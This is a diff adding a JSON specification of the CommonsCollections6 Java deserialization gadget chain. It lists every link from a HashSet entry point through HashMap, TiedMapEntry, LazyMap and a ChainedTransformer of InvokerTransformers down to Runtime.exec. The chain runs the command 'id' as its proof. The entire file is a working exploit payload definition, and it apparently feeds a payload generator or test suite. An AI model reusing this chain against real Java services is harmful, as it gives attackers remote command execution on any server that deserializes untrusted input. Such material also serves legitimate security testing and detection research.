@@ -1,0 +1,69 @@
+{
+  "chain_type": "CommonsCollections6 — HashSet entry point (CC 3.x)",
+  "root_class": "java.util.HashSet",
+  "root_trigger": "readObject→HashMap.put→hash→TiedMapEntry.hashCode→LazyMap.get",
+  "links": [
+    {
+      "class": "java.util.HashMap",
+      "field_overrides": {
+        "key": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {"$ref": "link:2"},
+        "key": "anything"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": {},
+        "factory": {"$ref": "link:3"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:4"},
+          {"$ref": "link:5"},
+          {"$ref": "link:6"},
+          {"$ref": "link:7"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": "java.lang.Runtime"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "getMethod",
+        "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+        "iArgs": ["getRuntime", []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "invoke",
+        "iParamTypes": ["java.lang.Object", "[Ljava.lang.Object;"],
+        "iArgs": [null, []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "exec",
+        "iParamTypes": ["java.lang.String"],
+        "iArgs": ["id"]
+      }
+    }
+  ],
+  "sink_method": "Runtime.exec"
+}
